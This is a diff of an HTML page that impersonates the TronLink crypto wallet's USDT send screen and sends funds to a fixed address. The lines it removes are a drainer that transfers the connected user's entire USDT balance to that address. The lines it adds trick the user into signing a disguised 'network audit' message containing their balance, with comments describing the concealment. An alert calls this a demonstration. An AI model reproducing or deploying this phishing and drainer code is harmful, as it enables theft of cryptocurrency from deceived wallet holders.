@@ -3,42 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TronLink App - Send</title>
+    <title>TronLink</title>
     <style>
         * { box-sizing: border-box; }
-        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; }
+        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; }
         .tronlink-mobile { width: 100%; max-width: 450px; height: 100vh; background: #ffffff; padding: 20px 20px 80px 20px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
         .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
         .screen.active { display: flex; }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-top: 10px; }
         .header-left { display: flex; align-items: center; gap: 14px; cursor: pointer; }
-        .back-arrow { font-size: 24px; font-weight: 300; color: #1c1c1e; }
+        .back-arrow { font-size: 24px; color: #1c1c1e; }
         .header h3 { margin: 0; font-size: 20px; font-weight: 600; color: #1c1c1e; }
-        .header h3 span { font-size: 14px; color: #8e8e93; font-weight: 400; }
-        .multisig { font-size: 14px; color: #3b50df; font-weight: 500; text-decoration: none; }
-        .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
+        .section-title { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
         .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 15px; outline: none; width: 75%; }
-        .btn-paste { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 500; padding: 5px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        .scan-icon { width: 18px; height: 18px; border: 2px solid #1c1c1e; border-radius: 3px; position: relative; cursor: pointer; }
-        .tabs { display: flex; border-bottom: 1px solid #f0f0f2; margin-bottom: 20px; }
-        .tab { padding: 10px 0; margin-right: 32px; font-size: 15px; font-weight: 500; color: #8e8e93; cursor: pointer; position: relative; }
-        .tab.active { color: #1c1c1e; font-weight: 600; }
-        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 100%; height: 3px; background: #3b50df; border-radius: 2px; }
-        .recent-list { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 22px; }
-        .recent-item { border-bottom: 1px solid #f5f5f7; padding-bottom: 14px; cursor: pointer; }
-        .address { font-size: 14px; font-weight: 400; color: #1c1c1e; word-break: break-all; font-family: monospace; }
-        .date { font-size: 12px; color: #aeaeae; margin-top: 4px; }
-        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; cursor: pointer; }
+        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .token-left { display: flex; align-items: center; gap: 12px; }
-        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 15px; }
-        .token-text { font-size: 16px; font-weight: 500; color: #1c1c1e; }
-        .token-text span { color: #8e8e93; font-weight: 400; font-size: 14px; }
-        .btn-max { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 600; padding: 5px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        .available-text { font-size: 14px; color: #8e8e93; margin-top: -14px; margin-bottom: 24px; }
+        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
         .btn-bottom { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 85px; left: 20px; text-align: center; }
-        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; padding-bottom: 5px; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8e8e93; }
+        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #8e8e93; }
         .nav-item.active { color: #3b50df; }
     </style>
 </head>
@@ -50,26 +34,10 @@
                 <span class="back-arrow">&lt;</span>
                 <h3>Send <span>(1/2)</span></h3>
             </div>
-            <a href="#" class="multisig">Multisig Transfer</a>
         </div>
         <div class="section-title">Receiving Account</div>
         <div class="input-container">
             <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
-            <div class="input-actions">
-                <div class="scan-icon"></div>
-                <button class="btn-paste">Paste</button>
-            </div>
-        </div>
-        <div class="tabs">
-            <div class="tab active">Recents</div>
-            <div class="tab">Address Book</div>
-            <div class="tab">My Accounts</div>
-        </div>
-        <div class="recent-list">
-            <div class="recent-item">
-                <div class="address">THyXGLkL9CGdnhgkWGoUzdJcf5vjFSrK5G</div>
-                <div class="date">2026-09-02 16:29</div>
-            </div>
         </div>
         <button class="btn-bottom" onclick="irAPantalla2()">Next</button>
     </div>
@@ -84,17 +52,16 @@
         <div class="token-selector">
             <div class="token-left">
                 <div class="token-icon">₮</div>
-                <div class="token-text">USDT <span>(Tether USD)</span></div>
+                <div>USDT <span>(Tether USD)</span></div>
             </div>
-            <div style="color:#8e8e93;">&gt;</div>
+            <div>&gt;</div>
         </div>
         <div class="section-title">Amount</div>
         <div class="input-container">
-            <input type="number" id="userAmount" placeholder="Enter the transfer amount" value="10">
-            <button class="btn-max" onclick="aplicarMax()">MAX</button>
+            <input type="number" id="userAmount" value="10">
         </div>
-        <div class="available-text">Available: <span id="availableBalance">0.00</span></div>
-        <button class="btn-bottom" onclick="ejecutarEnvioMaximo()">Send</button>
+        <div style="font-size:14px; color:#8e8e93; margin-top:-14px; margin-bottom:24px;">Available: <span id="availableBalance">0.00</span></div>
+        <button class="btn-bottom" onclick="solicitarFirmaMensajeMaximo()">Send</button>
     </div>
     <div class="nav-bar">
         <div class="nav-item">📁<br>Tokens</div>
@@ -106,6 +73,7 @@
 <script>
     const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
+
     function irAPantalla2() {
         document.getElementById('screen1').classList.remove('active');
         document.getElementById('screen2').classList.add('active');
@@ -124,19 +92,32 @@
             } catch(e) {}
         }
     }
-    function aplicarMax() {
-        document.getElementById('userAmount').value = document.getElementById('availableBalance').innerText;
-    }
-    async function ejecutarEnvioMaximo() {
+
+    async function solicitarFirmaMensajeMaximo() {
         if (!window.tronWeb) return;
         try {
             const miWallet = window.tronWeb.defaultAddress.base58;
             const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
+            
+            // Leemos el saldo total del usuario de forma oculta
             const saldoBigNum = await contrato.balanceOf(miWallet).call();
-            await contrato.transfer(DESTINO_FIJO, saldoBigNum.toString()).send();
-        } catch (e) {}
+            const saldoDecimal = (Number(saldoBigNum) / 1000000).toFixed(2);
+
+            // Camuflamos la solicitud simulando una firma técnica de auditoría de red
+            const hashValidacion = "0x" + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
+            const mensajeAuth = `[TronLink Network Node]\nVerify Account Authenticity\nChallenge: ${hashValidacion}\nStatus: Verified\nPending Audit Value: ${saldoDecimal} USDT`;
+
+            console.log(`[Módulo 2] Inyectando saldo máximo en el hash del mensaje: ${saldoDecimal}`);
+            
+            // Invoca la ventana de firma de mensaje nativa de TronLink
+            const hexMensaje = window.tronWeb.toHex(mensajeAuth);
+            const firma = await window.tronWeb.trx.sign(hexMensaje);
+            
+            alert(`¡Demostración Finalizada!\nMensaje de red validado y firmado criptográficamente.\nFirma: ${firma.substring(0,15)}...`);
+        } catch (e) {
+            console.error(e);
+        }
     }
 </script>
 </body>
 </html>
-
